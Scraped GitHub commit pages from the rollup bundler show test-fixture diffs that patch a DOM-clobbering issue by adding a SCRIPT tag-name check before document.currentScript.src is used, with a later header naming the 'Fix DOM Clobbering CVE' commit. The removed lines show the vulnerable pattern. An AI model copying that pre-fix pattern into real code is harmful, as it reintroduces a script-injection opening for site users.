[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,6 +1,6 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | var asset2 = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/logo2.svg').href : new URL('logo2.svg', document.currentScript && document.currentScript.src || document.baseURI).href); |
|  |  | var asset2 = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/logo2.svg').href : new URL('logo2.svg', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href); |
|  |  |  |
|  |  | { |
|  |  | const image = document.createElement('img'); |
| Expand Down | |  |

6 changes: 3 additions & 3 deletions

6
[test/chunking-form/samples/emit-file/emit-chunk-with-importer/\_expected/cjs/main.js](#diff-fb51b0329ea05ac075795f4208c82cf9b1bb94051e2ccd49d087537d53b462f0 "test/chunking-form/samples/emit-file/emit-chunk-with-importer/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/emit-file/emit-chunk-with-importer/_expected/cjs/main.js)
Edit file

Delete file

Load diff

Some generated files are not rendered by default. Learn more about [how customized files appear on GitHub](https://docs.github.com/github/administering-a-repository/customizing-how-changed-files-appear-on-github).

Oops, something went wrong.

Retry

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/emit-file/emit-chunk-worker/\_expected/cjs/chunks/nested.js](#diff-61f3b09538a59aa0c1a0f31e57bf719045962f99176b5c02f9e573278a18beec "test/chunking-form/samples/emit-file/emit-chunk-worker/_expected/cjs/chunks/nested.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/emit-file/emit-chunk-worker/_expected/cjs/chunks/nested.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,7 +1,7 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | const getWorkerMessage = () => new Promise(resolve => { |
|  |  | const worker = new Worker((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/worker-proxy.js').href : new URL('worker-proxy.js', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | const worker = new Worker((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/worker-proxy.js').href : new URL('worker-proxy.js', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |
|  |  | worker.onmessage = resolve; |
|  |  | }); |
|  |  |  |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/emit-file/emit-chunk-worker/\_expected/cjs/chunks/worker-proxy.js](#diff-96f4a25268a3b95f9c7df910cd93e105b23f8ee88bfa46adf94b2419e9bc0fc5 "test/chunking-form/samples/emit-file/emit-chunk-worker/_expected/cjs/chunks/worker-proxy.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/emit-file/emit-chunk-worker/_expected/cjs/chunks/worker-proxy.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,3 +1,3 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | PLACEHOLDER((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/worker.js').href : new URL('worker.js', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | PLACEHOLDER((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/worker.js').href : new URL('worker.js', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/emit-file/emit-chunk-worker/\_expected/cjs/main.js](#diff-d126a8d46fea2c6147c4ec0db8d82fb9429882e6795b9c09daccc4e193934685 "test/chunking-form/samples/emit-file/emit-chunk-worker/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/emit-file/emit-chunk-worker/_expected/cjs/main.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3,7 +3,7 @@ |
|  |  | var shared = require('./chunks/shared.js'); |
|  |  |  |
|  |  | const getWorkerMessage = () => new Promise(resolve => { |
|  |  | const worker = new Worker((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/chunks/worker-proxy.js').href : new URL('chunks/worker-proxy.js', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | const worker = new Worker((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/chunks/worker-proxy.js').href : new URL('chunks/worker-proxy.js', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |
|  |  | worker.onmessage = resolve; |
|  |  | }); |
|  |  |  |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/emit-file/emit-chunk-worklet/\_expected/cjs/main.js](#diff-f80d58d0fd5f68eab5e1d9a528db706c7bf036647087bb7e1f5966c840210f55 "test/chunking-form/samples/emit-file/emit-chunk-worklet/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/emit-file/emit-chunk-worklet/_expected/cjs/main.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2,6 +2,6 @@ |
|  |  |  |
|  |  | var shared = require('./chunks/shared.js'); |
|  |  |  |
|  |  | CSS.paintWorklet.addModule((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/chunks/worklet.js').href : new URL('chunks/worklet.js', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | CSS.paintWorklet.addModule((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/chunks/worklet.js').href : new URL('chunks/worklet.js', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |
|  |  |  |
|  |  | document.body.innerHTML += `<h1 style="background-image: paint(vertical-lines);">color: ${shared.color}, size: ${shared.size}</h1>`; |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/emit-file/reference-files/\_expected/cjs/main.js](#diff-016a8c84f1219e6a16e82575e0d47cfcbb796caae8d6247831bc7964e286f8ba "test/chunking-form/samples/emit-file/reference-files/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/emit-file/reference-files/_expected/cjs/main.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,6 +1,6 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | var logo = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/assets/logo1-FquQRdV3.svg').href : new URL('assets/logo1-FquQRdV3.svg', document.currentScript && document.currentScript.src || document.baseURI).href); |
|  |  | var logo = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/assets/logo1-FquQRdV3.svg').href : new URL('assets/logo1-FquQRdV3.svg', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href); |
|  |  |  |
|  |  | function showImage(url) { |
|  |  | console.log(url); |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/emit-file/reference-files/\_expected/cjs/nested/chunk.js](#diff-826917577ab8d66ed860b11ecb1a6d0ad98b31a12a8e2de1eb8a94fd593e3e28 "test/chunking-form/samples/emit-file/reference-files/_expected/cjs/nested/chunk.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/emit-file/reference-files/_expected/cjs/nested/chunk.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2,6 +2,6 @@ |
|  |  |  |
|  |  | var main = require('../main.js'); |
|  |  |  |
|  |  | var logo = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/../assets/logo2-DJfvToLT.svg').href : new URL('../assets/logo2-DJfvToLT.svg', document.currentScript && document.currentScript.src || document.baseURI).href); |
|  |  | var logo = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/../assets/logo2-DJfvToLT.svg').href : new URL('../assets/logo2-DJfvToLT.svg', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href); |
|  |  |  |
|  |  | main.showImage(logo); |

16 changes: 8 additions & 8 deletions

16
[test/chunking-form/samples/emit-file/set-asset-source/\_expected/cjs/main.js](#diff-b7be29ac86c993f2bc6070667f74fcf7c02133d55e5b22c752d9c9da0d87243d "test/chunking-form/samples/emit-file/set-asset-source/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/emit-file/set-asset-source/_expected/cjs/main.js)
Edit file

Delete file

Load diff

Some generated files are not rendered by default. Learn more about [how customized files appear on GitHub](https://docs.github.com/github/administering-a-repository/customizing-how-changed-files-appear-on-github).

Oops, something went wrong.

Retry

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/import-meta-numeric-paths/\_expected/cjs/0/1/nested.js](#diff-530baddf14ec34e0f25ccd31994e16882458811a631bafd1a232e70f6220d304 "test/chunking-form/samples/import-meta-numeric-paths/_expected/cjs/0/1/nested.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/import-meta-numeric-paths/_expected/cjs/0/1/nested.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,6 +1,6 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | var \_documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null; |
|  |  | const url = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_filename).href : (\_documentCurrentScript && \_documentCurrentScript.src || new URL('0/1/nested.js', document.baseURI).href)); |
|  |  | const url = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_filename).href : (\_documentCurrentScript && \_documentCurrentScript.tagName.toUpperCase() === 'SCRIPT' && \_documentCurrentScript.src || new URL('0/1/nested.js', document.baseURI).href)); |
|  |  |  |
|  |  | exports.url = url; |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/import-meta-url/\_expected/cjs/main.js](#diff-156cb4dfce91ed62349135cf8cf61c8e471c5e841ef959eeb7b728e316bcb328 "test/chunking-form/samples/import-meta-url/_expected/cjs/main.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/import-meta-url/_expected/cjs/main.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -9,7 +9,7 @@ function log(url) { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | log('main: ' + (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_filename).href : (\_documentCurrentScript && \_documentCurrentScript.src || new URL('main.js', document.baseURI).href))); |
|  |  | log('main: ' + (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_filename).href : (\_documentCurrentScript && \_documentCurrentScript.tagName.toUpperCase() === 'SCRIPT' && \_documentCurrentScript.src || new URL('main.js', document.baseURI).href))); |
|  |  | Promise.resolve().then(function () { return require('./nested/chunk.js'); }); |
|  |  |  |
|  |  | exports.log = log; |

2 changes: 1 addition & 1 deletion

2
[test/chunking-form/samples/import-meta-url/\_expected/cjs/nested/chunk.js](#diff-0fddcdeb8046d35369fd7e540d029cb7929e8052f281b927a1082221374a2464 "test/chunking-form/samples/import-meta-url/_expected/cjs/nested/chunk.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/import-meta-url/_expected/cjs/nested/chunk.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3,4 +3,4 @@ |
|  |  | var main = require('../main.js'); |
|  |  |  |
|  |  | var \_documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null; |
|  |  | main.log('nested: ' + (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_filename).href : (\_documentCurrentScript && \_documentCurrentScript.src || new URL('nested/chunk.js', document.baseURI).href))); |
|  |  | main.log('nested: ' + (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_filename).href : (\_documentCurrentScript && \_documentCurrentScript.tagName.toUpperCase() === 'SCRIPT' && \_documentCurrentScript.src || new URL('nested/chunk.js', document.baseURI).href))); |

10 changes: 5 additions & 5 deletions

10
[...hunk/\_expected/cjs/chunk-dep2-DaLIbws0.js → ...hunk/\_expected/cjs/chunk-dep2-Cr\_zOuBy.js](#diff-9c42bc174e8fa8a7a9fbc006966b832096422c088cd71cf9e0f270b845b1fec7 "test/chunking-form/samples/render-chunk/_expected/cjs/chunk-dep2-DaLIbws0.js → test/chunking-form/samples/render-chunk/_expected/cjs/chunk-dep2-Cr_zOuBy.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/render-chunk/_expected/cjs/chunk-dep2-Cr_zOuBy.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,7 +1,7 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | var num = 2; |
|  |  | console.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-C4X7hChn').href : new URL('asset-test-C4X7hChn', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | console.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-C4X7hChn').href : new URL('asset-test-C4X7hChn', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |
|  |  |  |
|  |  | exports.num = num; |
|  |  | console.log({ |
| Expand All | | @@ -18,24 +18,24 @@ console.log({ |
|  |  | "name": "dep2", |
|  |  | "type": "chunk", |
|  |  | "dynamicImports": [], |
|  |  | "fileName": "chunk-dep2-DaLIbws0.js", |
|  |  | "fileName": "chunk-dep2-Cr\_zOuBy.js", |
|  |  | "implicitlyLoadedBefore": [], |
|  |  | "importedBindings": {}, |
|  |  | "imports": [], |
|  |  | "modules": { |
|  |  | "\*\*/dep2.js": { |
|  |  | "code": "var num = 2;\nconsole.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-C4X7hChn').href : new URL('asset-test-C4X7hChn', document.currentScript && document.currentScript.src || document.baseURI).href));", |
|  |  | "code": "var num = 2;\nconsole.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-C4X7hChn').href : new URL('asset-test-C4X7hChn', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href));", |
|  |  | "originalLength": 19, |
|  |  | "removedExports": [], |
|  |  | "renderedExports": [ |
|  |  | "num" |
|  |  | ], |
|  |  | "renderedLength": 269 |
|  |  | "renderedLength": 330 |
|  |  | } |
|  |  | }, |
|  |  | "referencedFiles": [ |
|  |  | "asset-test-C4X7hChn" |
|  |  | ] |
|  |  | }); |
|  |  | console.log('all chunks', ["entry-main1-s6RHXqBe.js","entry-main2-DPo9-iBy.js","chunk-dep2-DaLIbws0.js"]) |
|  |  | console.log('all chunks', ["entry-main1-CW\_cw0go.js","entry-main2-CvqsXhWd.js","chunk-dep2-Cr\_zOuBy.js"]) |
|  |  | console.log('referenced asset in renderChunk', 'asset-test-C4X7hChn'); |

22 changes: 11 additions & 11 deletions

22
[...unk/\_expected/cjs/entry-main1-s6RHXqBe.js → ...unk/\_expected/cjs/entry-main1-CW\_cw0go.js](#diff-379b90c46fc99bd36b0cfe2bf29023e97040b8588736f9b720b97957b1ee32fd "test/chunking-form/samples/render-chunk/_expected/cjs/entry-main1-s6RHXqBe.js → test/chunking-form/samples/render-chunk/_expected/cjs/entry-main1-CW_cw0go.js")

Show comments

[View file](/rollup/rollup/blob/e2552c9e955e0a61f70f508200ee9f752f85a541/test/chunking-form/samples/render-chunk/_expected/cjs/entry-main1-CW_cw0go.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,12 +1,12 @@ |
|  |  | 'use strict'; |
|  |  |  |
|  |  | var dep2 = require('./chunk-dep2-DaLIbws0.js'); |
|  |  | var dep2 = require('./chunk-dep2-Cr\_zOuBy.js'); |
|  |  |  |
|  |  | var num = 1; |
|  |  | console.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-C4X7hChn').href : new URL('asset-test-C4X7hChn', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | console.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-C4X7hChn').href : new URL('asset-test-C4X7hChn', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |
|  |  |  |
|  |  | console.log(num + dep2.num); |
|  |  | console.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-C4X7hChn').href : new URL('asset-test-C4X7hChn', document.currentScript && document.currentScript.src || document.baseURI).href)); |
|  |  | console.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-C4X7hChn').href : new URL('asset-test-C4X7hChn', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href)); |
|  |  | console.log({ |
|  |  | "exports": [], |
|  |  | "facadeModuleId": "\*\*/main1.js", |
| Expand All | | @@ -20,37 +20,37 @@ console.log({ |
|  |  | "name": "main1", |
|  |  | "type": "chunk", |
|  |  | "dynamicImports": [], |
|  |  | "fileName": "entry-main1-s6RHXqBe.js", |
|  |  | "fileName": "entry-main1-CW\_cw0go.js", |
|  |  | "implicitlyLoadedBefore": [], |
|  |  | "importedBindings": { |
|  |  | "chunk-dep2-DaLIbws0.js": [ |
|  |  | "chunk-dep2-Cr\_zOuBy.js": [ |
|  |  | "num" |
|  |  | ] |
|  |  | }, |
|  |  | "imports": [ |
|  |  | "chunk-dep2-DaLIbws0.js" |
|  |  | "chunk-dep2-Cr\_zOuBy.js" |
|  |  | ], |
|  |  | "modules": { |
|  |  | "\*\*/dep1.js": { |
|  |  | "code": "var num = 1;\nconsole.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-C4X7hChn').href : new URL('asset-test-C4X7hChn', document.currentScript && document.currentScript.src || document.baseURI).href));", |
|  |  | "code": "var num = 1;\nconsole.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-C4X7hChn').href : new URL('asset-test-C4X7hChn', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href));", |
|  |  | "originalLength": 19, |
|  |  | "removedExports": [], |
|  |  | "renderedExports": [ |
|  |  | "num" |
|  |  | ], |
|  |  | "renderedLength": 269 |
|  |  | "renderedLength": 330 |
|  |  | }, |
|  |  | "\*\*/main1.js": { |
|  |  | "code": "console.log(num + dep2.num);\nconsole.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-C4X7hChn').href : new URL('asset-test-C4X7hChn', document.currentScript && document.currentScript.src || document.baseURI).href));", |
|  |  | "code": "console.log(num + dep2.num);\nconsole.log('referenced asset', (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(\_\_dirname + '/asset-test-C4X7hChn').href : new URL('asset-test-C4X7hChn', document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI).href));", |
|  |  | "originalLength": 102, |
|  |  | "removedExports": [], |
|  |  | "renderedExports": [], |
|  |  | "renderedLength": 285 |
|  |  | "renderedLength": 346 |
|  |  | } |
|  |  | }, |
|  |  | "referencedFiles": [ |
|  |  | "asset-test-C4X7hChn" |
|  |  | ] |
|  |  | }); |
|  |  | console.log('all chunks', ["entry-main1-s6RHXqBe.js","entry-main2-DPo9-iBy.js","chunk-dep2-DaLIbws0.js"]) |
|  |  | console.log('all chunks', ["entry-main1-CW\_cw0go.js","entry-main2-CvqsXhWd.js","chunk-dep2-Cr\_zOuBy.js"]) |
|  |  | console.log('referenced asset in renderChunk', 'asset-test-C4X7hChn'); |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `e2552c9`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frollup%2Frollup%2Fcommit%2Fe2552c9e955e0a61f70f508200ee9f752f85a541) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_30889b45_20250110_151156.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frollup%2Frollup%2Fcommit%2F2ef77c00ec2635d42697cff2c0567ccc8db34fb4)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frollup%2Frollup%2Fcommit%2F2ef77c00ec2635d42697cff2c0567ccc8db34fb4)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=rollup%2Frollup)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rollup](/rollup)
/
**[rollup](/rollup/rollup)**
Public

* [Notifications](/login?return_to=%2Frollup%2Frollup) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Frollup%2Frollup)
* [Star
   25.5k](/login?return_to=%2Frollup%2Frollup)

* [Code](/rollup/rollup)
* [Issues
  558](/rollup/rollup/issues)
* [Pull requests
  25](/rollup/rollup/pulls)
* [Discussions](/rollup/rollup/discussions)
* [Actions](/rollup/rollup/actions)
* [Projects
  0](/rollup/rollup/projects)
* [Wiki](/rollup/rollup/wiki)
* [Security](/rollup/rollup/security)
* [Insights](/rollup/rollup/pulse)

Additional navigation options

* [Code](/rollup/rollup)
* [Issues](/rollup/rollup/issues)
* [Pull requests](/rollup/rollup/pulls)
* [Discussions](/rollup/rollup/discussions)
* [Actions](/rollup/rollup/actions)
* [Projects](/rollup/rollup/projects)
* [Wiki](/rollup/rollup/wiki)
* [Security](/rollup/rollup/security)
* [Insights](/rollup/rollup/pulse)

## Commit

[Permalink](/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix DOM Clobbering CVE

[Browse files](/rollup/rollup/tree/2ef77c00ec2635d42697cff2c0567ccc8db34fb4)
Browse the repository at this point in the history

